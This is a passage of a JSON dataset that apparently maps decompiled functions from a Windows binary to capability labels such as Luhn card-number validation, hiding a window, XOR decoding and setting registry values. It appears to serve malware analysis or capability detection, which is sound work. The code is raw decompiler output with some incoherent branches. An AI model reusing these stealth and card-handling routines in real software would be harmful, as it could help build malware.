}\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 350
    },
    "00404880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404880(uint arg_8h, uint arg_ch)\n\n{\n    uint lpServiceName;\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uchar in_ZF;\n    bool in_SF;\n    float10 in_ST0;\n    \n    puVar3 = &stack0xfffffffc;\n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n        in_ZF = *(unaff_ESI + 4) == *(unaff_EDI + 4);\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    puVar5 = &stack0xfffffffc;\n    if ((!in_ZF) && (puVar5 = &stack0xfffffffc,  in_ZF)) {\n        puVar4 = &stack0xffffffe8;\n        puVar5 = &stack0xffffffe8;\n        cVar1 = '\\x10';\n        do {\n            puVar3 = puVar3 + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *puVar3;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    lpServiceName = *(puVar5 + 8);\n    fcn.004035c0(uVar2, lpServiceName);\n    uVar2 = fcn.00404710(uVar2, lpServiceName, *(puVar5 + 0xc));\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n    return uVar2;\n}\n",
        "token_count": 393
    },
    "00404b00": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404b00(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00402330": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402330(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x411190, 0x423638, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 137
    },
    "00402390": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402405) overlaps instruction at (ram,0x00402401)\n// \n// WARNING: Removing unreachable block (ram,0x004023f6)\n// WARNING: Removing unreachable block (ram,0x004023f8)\n// WARNING: Removing unreachable block (ram,0x004023db)\n\nint32_t __cdecl fcn.00402390(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    bool bVar8;\n    uint auStack24 [2];\n    \n    puVar5 = &stack0xfffffffc;\n    uVar4 = 0;\n    bVar7 = false;\n    uVar2 = arg_14h;\n    if (arg_14h != 0) {\n        do {\n            bVar8 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n            if ((bVar8) && (!bVar8)) {\n                puVar6 = auStack24 + 1;\n                cVar1 = '\\x1e';\n                do {\n                    puVar5 = puVar5 + -1;\n                    puVar6 = puVar6 + -1;\n                    *puVar6 = *puVar5;\n                    cVar1 = cVar1 + -1;\n                } while ('\\0' < cVar1);\n                iVar3 = in(0x78);\n                return iVar3;\n            }\n            if ((!bVar7) && (bVar7)) {\n                out(0xbd, in_EAX);\n                return in_EAX;\n            }\n            *(uVar4 + arg_10h) = *(uVar4 + arg_10h) ^ *(uVar4 % arg_ch + arg_8h);\n            uVar4 = uVar4 + 1;\n            bVar7 = uVar4 < arg_14h;\n            in_EAX = arg_8h;\n            uVar2 = uVar4 - arg_14h;\n        } while (bVar7);\n    }\n    return in_EAX;\n}\n",
        "token_count": 516
    },
    "004041f0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004041f0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x423374, 0x4233b8, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 80
    }
}